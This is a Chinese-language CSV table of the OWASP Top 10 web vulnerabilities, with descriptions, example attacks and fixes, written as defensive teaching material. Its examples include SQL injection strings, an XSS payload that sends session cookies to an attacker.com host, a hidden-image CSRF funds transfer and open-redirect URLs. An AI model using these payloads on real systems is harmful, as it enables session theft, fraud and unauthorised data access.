漏洞ID,漏洞名称,漏洞等级,漏洞描述,代码示例,修复方案
A1,注入攻击,高危,注入攻击漏洞，例如SQL，OS以及LDAP注入。这些攻击发生在当不可信的数据作为命令或查询语句的一部分，被发送给解释器的时候。攻击者发送的恶意数据可以欺骗解释器，以执行计划外的命令或者在未被恰当授权时访问数据。,"案例#1：应用程序在下面存在漏洞的SQL语句的构造中使
用不可信数据：
String query = ""SELECT * FROM accounts WHERE
custID='"" + request.getParameter(""id"") +""'"";
案例#2：同样的，框架应用的盲目信任，仍然可能导致查
询语句的漏洞。（例如：Hibernate查询语言（HQL））：
Query HQLQuery = session.createQuery(“FROM accounts 
WHERE custID='“ + request.getParameter(""id"") + ""'"");
在这两个案例中，攻击者在浏览器中将“id”参数的值修改
成 ’ or’1’=’1。如：
http://example.com/app/accountView?id=' or '1'='1 
这样查询语句的意义就变成了从accounts表中返回所有的
记录。更危险的攻击可能导致数据被篡改甚至是存储过程
被调用。","防止注入漏洞需要将不可信数据从命令及查询中区分开。
1. 最佳选择是使用安全的API，完全避免使用解释器或提
供参数化界面的API。但要注意有些参数化的API，比
如存储过程（stored procedures），如果使用不当，
仍然可以引入注入漏洞。
2. 如果没法使用一个参数化的API，那么你应该使用解释
器具体的escape语法来避免特殊字符。 OWASP的
ESAPI 就有一些escape例程。
3. 使用正面的或“白名单”的具有恰当的规范化的输入
验证方法同样会有助于防止注入攻击。但由于很多应
用在输入中需要特殊字符，这一方法不是完整的防护
方法。"
A2,失效的身份认证和会话管理,高危,与身份认证和会话管理相关的应用程序功能往往得不到正确的实现，这就导致了攻击者破坏密码、密匙、会话令牌或攻击其他的漏洞去冒充其他用户的身份。,"如何能够保护用户凭证和会话ID等会话管理资产呢？以下
情况可能产生漏洞：
1. 用户身份验证凭证没有使用哈希或加密保护。 详见
A6。
2. 认证凭证可猜测，或者能够通过薄弱的的帐户管理功
能（例如账户创建、密码修改、密码恢复, 弱会话ID）
重写。
3. 会话ID暴露在URL里 （例如, URL重写） 。
4. 会话ID容易受到会话固定（session fixation） 的攻击。
5. 会话ID没有超时限制，或者用户会话或身份验证令牌
特别是单点登录令牌在用户注销时没有失效。
6. 成功注册后,会话ID没有轮转。
7. 密码、会话ID和其他认证凭据使用未加密连接传输。","对企业最主要的建议是让开发人员使用如下资源：
1. 一套单一的强大的认证和会话管理控制系统。这套控
制系统应:
a) 满足OWASP的应用程序安全验证标准（ASVS）
中V2（认证）和V3（会话管理）中制定的所
有认证和会话管理的要求。
b) 具有简单的开发界面。 ESAPI认证器和用户
API是可以仿照、使用或扩展的好范例。
2. 企业同样也要做出巨大努力来避免跨站漏洞，因为这
一漏洞可以用来盗窃用户会话ID。"
A3,跨站脚本（XSS）,高危,当应用程序收到含有不可信的数据，在没有进行适当的验证和转义的情况下，就将它发送给一个网页浏览器，这就会产生跨站脚本攻击（简称xSS）。XSS允许攻击者在受害者的浏览器上执行脚本，从而劫持用户会话、危害网站、或者将用户转向至恶意网站。,"应用程序在下面HTML代码段的构造中使用未经验证或转
义的不可信的数据：
（String） page += ""<input name='creditcard' type='TEXT‘
value='"" + request.getParameter（""CC""） + ""'>"";
攻击者在浏览器中修改“CC” 参数为如下值：
'><script>document.location=
'http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie</script>'.
这导致受害者的会话ID被发送到攻击者的网站，使得攻击
者能够劫持用户当前会话。
请注意攻击者同样能使用跨站脚本攻破应用程序可能使
用的任何跨站请求伪造（CSRF）防御机制。","防止XSS需要将不可信数据与动态的浏览器内容区分开。
1. 最好的办法是根据数据将要置于的HTML上下文（包括
主体、属性、JavaScript、CSS或URL）对所有的不可信
数据进行恰当的转义 （escape） 。更多关于数据转义
技术的信息见OWASP XSS Prevention Cheat Sheet 。
2. 使用正面的或“白名单”的， 具有恰当的规范化和解
码功能的输入验证方法同样会有助于防止跨站脚本。
但由于很多应用程序在输入中需要特殊字符，这一方
法不是完整的防护方法。这种验证方法需要尽可能地
解码任何编码输入，同时在接受输入之前需要充分验
证数据的长度、字符、格式、和任何商务规则。
3. 考虑使用内容安全策略（CSP）来抵御整个网站的跨
站脚本攻击。"
A4,不安全的直接对象引用,中危,当开发人员暴露一个对内部实现对象的引用时，例如，一个文件、目录或者数据库密匙，就会产生一个不安全的直接对象引用。在没有访问控制检测或其他保护时，攻击者会操控这些引用去访问未授权数据。,"应用程序在访问帐户信息的SQL调用中使用未验证数据：
String query = ""SELECT * FROM accts WHERE account = ?"";
PreparedStatement pstmt =
connection.prepareStatement(query , …);
pstmt.setString(1, request.getparameter(""acct""));
ResultSet results = pstmt.executeQuery();
攻击者能轻易在浏览器将 “acct” 参数修改成他所想要的
任何账户号码。如果应用程序没有进行恰当的验证，攻击
者就能访问任何用户的账户，而不仅仅是该目标用户的账
户。
http://example.com/app/accountInfo?acct=notmyacct","要防止不安全的直接对象引用，需要选择一个适当的方法
来保护每一个用户可访问的对象（如对象号码、文件名）：
1. 使用基于用户或者会话的间接对象引用。这样能防止
攻击者直接攻击未授权资源。例如，一个下拉列表包
含6个授权给当前用户的资源，它可以使用数字1-6来
指示哪个是用户选择的值，而不是使用资源的数据库
关键字来表示。在服务器端，应用程序需要将每个用
户的间接引用映射到实际的数据库关键字。OWASP的
ESAPI包含了两种序列和随机访问引用映射，开发人员
可以用来消除直接对象引用。
2. 检查访问。任何来自不可信源的直接对象引用都必须
通过访问控制检测，确保该用户对请求的对象有访问
权限。"
A5,安全配置错误,中危,好的安全需要对应用程序、框架、应用程序服务器、web服务器、数据库服务器和平台定义和执行安全配置。由于许多设置的默认值并不是安全的，因此，必须定义、实施和维护这些设置。这包含了对所有的软件保持及时地更新，包括所有应用程序的库文件。,"案例 #1：应用程序服务器管理员控制台自动安装后没有
被删除。而默认帐户也没有被改变。攻击者在你的服务器
上发现了标准的管理员页面，通过默认密码登录，从而接
管了你的服务器。
案例 #2：目录列表在你的服务器上未被禁用。攻击者发
现只需列出目录，她就可以找到你服务器上的任意文件。
攻击者找到并下载所有已编译的Java类，她通过反编译获
得了所有你的自定义代码。然后，她在你的应用程序中找
到一个访问控制的严重漏洞。
案例 #3：应用服务器配置允许堆栈跟踪返回给用户，这
样就暴露了潜在的漏洞。攻击者热衷于收集错误消息里提
供的额外信息。
案例 #4：应用服务器自带的示例应用程序没有从您的生
产服务器中删除。该示例应用有已知安全漏洞，攻击者可
以利用这些漏洞破坏您的服务器。","主要的建议建立在以下几个方面:
1. 一个可以快速且易于部署在另一个锁定环境的可重复
的加固过程。开发、质量保证和生产环境都应该配置
相同（每个环境中使用不同的密码）。这个过程应该
是自动化的，以尽量减少安装一个新安全环境的耗费。
2. 一个能及时了解并部署每个已部署环境的所有最新软
件更新和补丁的过程。这需要包括通常被忽略的所有
代码的库文件。
3. 一个能在组件之间提供有效的分离和安全性的强大应
用程序架构。
4. 实施漏洞扫描和经常进行审计以帮助检测将来可能的
错误配置或没有安装的补丁。"
A6,敏感信息泄露,高危,许多Web应用程序没有正确保护敏感数据，如信用卡，税务ID和身份验证凭据。攻击者可能会窃取或篡改这些弱保护的数据以进行信用卡诈骗、身份窃取或其他犯罪。敏感数据值需额外的保护，比如在存放或在传输过程中的加密，以及在与浏览器交换时进行特殊的预防措施。,"案例 #1：一个应用程序加密存储在数据库的信用卡信息，
以防止信用卡信息暴露给最终用户。但是，数据库设置为
对信用卡表列的查询进行自动解密，这就使得SQL注入漏
洞能够获得所有信用卡信息的明文。该系统应该被设置为
前端应用程序使用公钥对信用卡信息加密，后端应用程序
只能使用私钥解密。
案例 #2：一个网站上所有需要身份验证的网页都没有使
用SSL。攻击者只需监控网络数据流（比如一个开放的无
线网络或其社区的有线网络），并窃取一个已验证的受害
者的会话cookie。然后，攻击者利用这个cookie执行重放
攻击并接管用户的会话从而访问用户的隐私数据。
案例 #3：密码数据库使用unsalted的哈希算法去存储每个
人的密码。一个文件上传漏洞使黑客能够获取密码文件。
所有这些unsalted哈希的密码通过彩虹表暴力破解方式破
解。","有关使用不安全的加密算法、SSL使用和数据保护的风险
超出了Top 10的范围。尽管如此，对一些需要加密的敏感
数据，应该起码做到以下几点：
1. 预测一些威胁（比如内部攻击和外部用户），加密这
些数据的存储以确保免受这些威胁。
2. 对于没必要存放的、重要的敏感数据，应当尽快清除。
3. 确保使用了合适的强大的标准算法和强大的密匙，并
且密匙管理到位。可参考FIPS 140 validated 
cryptographic modules。
4. 确保使用密码专用算法存储密码，如：bcrypt、
PBKDF2或者scrypt。
5. 禁用自动完成防止敏感数据收集，禁用包含敏感数据
的缓存页面。"
A7,功能级访问控制缺失,中危,大多数Web应用程序在功能在Ui中可见以前，验证功能级别的访问权限。但是，应用程序需要在每个功能被访问时在服务器端执行相同的访问控制检查。如果请求没有被验证，攻击者能够伪造请求以在未经适当授权时访问功能。,"案例1#：攻击者仅仅直接浏览目标网址。例如下面的两个
网址都需要身份验证。同时访问“admin_getappInfo”页面
还需要管理员权限。
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo
如果未认证的用户可以访问上述任一页面，这就是漏洞。
如果通过验证的非管理员用户也能允许访问
“admin_getappInfo”页面，这同样是个漏洞。这个漏洞可
能会将攻击者引向更多保护不当的管理页面。
案例2#：一个页面提供了“action”参数给某个特定的功
能调用，并且不同的操作需要不同的角色。如果没有进行
角色检查，这也是漏洞。","您的应用程序应该使用一致的和易于分析的授权模块，并
能在所有的业务功能中调用该模块。通常是，由一个或多
个外部组件向应用代码内部提供这种保护。
1. 考虑一下管理权利的过程并确保能够容易的进行升级
和审计。切忌硬编码。
2. 执行机制在缺省情况下，应该拒绝所有访问。对于每
个功能的访问，需要明确授予特定角色的访问权限。
3. 如果某功能参与了工作流程，检查并确保当前的条件
是授权访问此功能的合适状态。
注意：多数web应用并不显示未授权功能的链接和按钮，
可是这种“展现层访问控制”实际上并不提供防护。您必
须还要实现控制或业务逻辑层面的检查。"
A8,跨站请求伪造（CSRF）,高危,跨站请求伪造攻击迫使登录用户的浏览器将伪造的HTTP请求，包括该用户的会话cookie和其他认证信息，发送到一个存在漏洞的web应用程序。这就充许了攻击者迫使用户浏览器向存在漏洞的应用程序发送请求，而这些请求会被应用程序认为是用户的合法请求。,"应用程序允许用户提交不包含任何保密字段的状态改变请
求，如：
http://example.com/app/transferFunds?amount=1500
&destinationAccount=4673243243
因此，攻击者构建一个请求，用于将受害用户账户中的现
金转移到自己账户。然后攻击者在其控制的多个网站的图
片请求或iframe中嵌入这种攻击。
<img src=""http://example.com/app/transferFunds?
amount=1500&destinationAccount=attackersAcct#“
width=""0"" height=""0"" />
如果受害用户通过example.com认证后访问任何一个攻击
者的网站，伪造的请求将自动包含用户的会话信息，授权
执行攻击者的请求。","防止跨站请求伪造，通常需要在每个HTTP请求中添加一个
不可预测的令牌。这种令牌至少应该对每一个用户会话来
说是唯一的。
1. 最好的方法是将独有的令牌包含在一个隐藏字段中。
这将使得该令牌通过HTTP请求体发送，避免其包含在
URL中从而被暴露出来。
2. 该独有令牌同样可以包含在URL中或作为一个URL参数。
但是这种方法的巨大风险在于：URL会暴露给攻击者，
这样秘密令牌也会被泄漏。
OWASP的CSRF Guard可以用来在Java EE, .NET, or PHP应用
程序中自动加入这种令牌。 OWASP的ESAPI包含了多种开
发者可以使用的方法来防止CSRF漏洞。
3. 要求用户重新认证或者判明他们是一个真实的用户
（例如通过CAPTCHA ）也可以防护CSRF攻击。"
A9,使用含有已知漏洞的组件,高危,组件，比如：库文件、框架和其它软件模块，几乎总是以全部的权限运行。如果一个带有漏洞的组件被利用，这种攻击可以造成更为严重的数据丢失或服务器接管。应用程序使用带有已知漏洞的组件会破坏应用程序防御系统，并使一系列可能的攻击和影响成为可能。,"组件中含有漏洞可以导致几乎所有可能存在的风险。从微
不足道的问题，到精心设计的用于攻击特定组织的恶意软
件。大多数组件在应用程序中一直以最高权限运行，所以
任意组件里的漏洞都是非常严重的。下面的两个含有漏洞
的组件在2011年被下载了2200万次。
?Apache CXF认证绕过 —未能提供身份令牌的情况下，
攻击者可以以最高权限调用任意的web服务。
（Apache CXF 是一个服务框架，不要与Apache应用服
务器混淆。）
?Spring远程代码执行—滥用Spring中语言表达式的实
现允许攻击者执行任意代码，有效的接管服务器。
每个使用上述两个任意一个库的应用程序，都是易于受到
攻击的。因为两个组件都会被应用用户直接访问。其他的
漏洞库，在应用程序中使用的越深入，可能越难被利用。","一个选择是停止使用非自己开发的组件，不过这并不现实。
另一个选择，使用最新版本的组件。大多数组件项目并不
为其老版本提供漏洞补丁。相反，它们仅仅在下个版本中
修正此问题。所以升级到新版本是很重要的。软件项目应
该有如下的流程：
1. 标识您正在使用的所有组件及其版本，包括所有的组
件（比如版本插件）。
2. 在公共数据库，项目邮件列表和安全邮件列表中时刻
关注这些组件的安全信息并保证它们是最新的。
3. 建立组件使用的安全策略，比如需要某些软件开发实
践，通过安全性测试和可接受的授权许可。
4. 在适当的情况下，考虑增加对组件的安全封装，去掉
不使用的功能和/或安全薄弱的或者组件易受攻击的方
面。"
A10,未验证的重定向和转发,中危,Web应用程序经常将用户重定向和转发到其他网页和网站，并且利用不可信的数据去判定目的页面。如果没有得到适当验证，攻击者可以重定向受害用户到钓鱼软件或恶意网站，或者使用转发去访问未授权的页面。,"案例 #1：应用程序有一个名为“redirect.jsp”的页面，该
页面有一个参数名是“url”。攻击者精心制作一个恶意URL
将用户重定向到一个恶意网站，执行钓鱼攻击并安装恶意
程序。
http://www.example.com/redirect.jsp?url=evil.com
案例 #2：应用程序使用转发在网站的不同部分之间发送
请求。为了帮助实现这一功能，如果一个交易成功了的话，
一些网页就会发送一个参数给用户，用于指定用户的下一
个页面。在这种情况下,攻击者制作一个URL, 用于绕过应
用程序的访问控制检查,并将他转发给一个他通常不能访
问的管理功能。
http://www.example.com/boring.jsp?fwd=admin.jsp","重定向和转发的安全使用可以有多种方式完成：
1. 避免使用重定向和转发。
2. 如果使用了重定向和转发，则不要在计算目标时涉及
到用户参数。这通常容易做到。
3. 如果使用目标参数无法避免,应确保其所提供的值对于
当前用户是有效的,并已经授权。
建议把这种目标的参数做成一个映射值，而不是真的
URL或其中的一部分，然后由服务器端代码将映射值
转换成目标URL。
应用程序可以使用ESAPI重写sendRedirect()方法来确保
所有重定向的目的地是安全的。
避免这种漏洞是非常重要的，因为钓鱼软件为了获取用户
信任，往往最喜欢攻击这种漏洞。"
